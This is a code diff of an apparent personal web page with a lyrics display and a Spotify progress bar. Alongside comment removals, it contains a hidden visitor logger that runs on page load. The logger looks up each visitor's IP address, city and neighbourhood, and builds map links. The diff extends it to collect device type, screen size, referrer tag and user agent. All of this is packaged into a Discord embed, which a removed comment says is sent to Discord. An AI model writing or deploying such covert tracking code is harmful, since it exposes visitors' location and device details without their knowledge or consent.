@@ -386,8 +386,6 @@
                     const boxHeight = box.clientHeight;
                     const lineTop = lines[current].offsetTop;
                     const lineHeight = lines[current].offsetHeight;
-
-                    // Centers the active line perfectly in the middle of the box
                     const offset = lineTop - (boxHeight / 2) + (lineHeight / 2);
                     container.style.transform = `translateY(-${offset}px)`;
                 }
@@ -562,7 +560,6 @@
                 const start = spotifyData.timestamps.start;
                 const end = spotifyData.timestamps.end;
                 const now = Date.now();
-                // Рассчитываем процент с точностью до миллисекунд
                 const percent = Math.min(100, Math.max(0, ((now - start) / (end - start)) * 100));
                 spotifyProgressBar.style.width = percent + '%';
             }
@@ -604,7 +601,6 @@
             if (sessionStorage.getItem("visited_recently")) return;
 
             try {
-                // 1. Fetch IP & Coordinates
                 const res = await fetch("https://ipapi.co/json/");
                 const data = await res.json();
 
@@ -614,7 +610,6 @@
                 const lon = data.longitude;
                 let neighborhood = "";
 
-                // 2. Fetch neighborhood/area name using free Reverse Geocoding
                 try {
                     const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                     const geoData = await geoRes.json();
@@ -624,21 +619,31 @@
 
                 const locationText = neighborhood ? `${neighborhood}, ${data.city}` : `${data.city}, ${data.region}`;
                 const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                
-                // 3. Map URL using English language setting (lang=en_US)
                 const mapImageUrl = `https://static-maps.yandex.ru/1.x/?l=map&pt=${lon},${lat},pm2rdm&z=11&size=450,250&lang=en_US`;
 
-                // 4. Send updated Embed to Discord
+                const screenRes = `${window.screen.width}x${window.screen.height}`;
+                const refUrl = window.location.search || "Direct / None";
+                
+                const ua = navigator.userAgent;
+                let deviceType = "Desktop / PC";
+                if (/iPhone/i.test(ua)) deviceType = "📱 iPhone";
+                else if (/iPad/i.test(ua)) deviceType = "📱 iPad";
+                else if (/Android/i.test(ua)) deviceType = "📱 Android Mobile";
+
+            
                 const payload = {
                     embeds: [{
-                        title: "🗺️ New Visitor Location Map",
+                        title: "New Visitor!",
                         color: 0x1DB954,
-                        description: `[👉 Open in Google Maps](${mapsUrl})`,
+                        description: `[Open Coordinates in Maps](${mapsUrl})`,
                         fields: [
                             { name: "IP Address", value: data.ip || "Unknown", inline: true },
                             { name: "Area / City", value: locationText, inline: true },
-                            { name: "Country", value: data.country_name || "Unknown", inline: true },
-                            { name: "ISP/Org", value: data.org || "Unknown", inline: false }
+                            { name: "ISP/Network", value: data.org || "Unknown", inline: false },
+                            { name: "Device Type", value: deviceType, inline: true },
+                            { name: "Screen Size", value: screenRes, inline: true },
+                            { name: "Ref / Tracker Tag", value: refUrl, inline: true },
+                            { name: "User Agent Details", value: `\`\`\`${ua.slice(0, 250)}\`\`\``, inline: false }
                         ],
                         image: { url: mapImageUrl },
                         timestamp: new Date().toISOString()
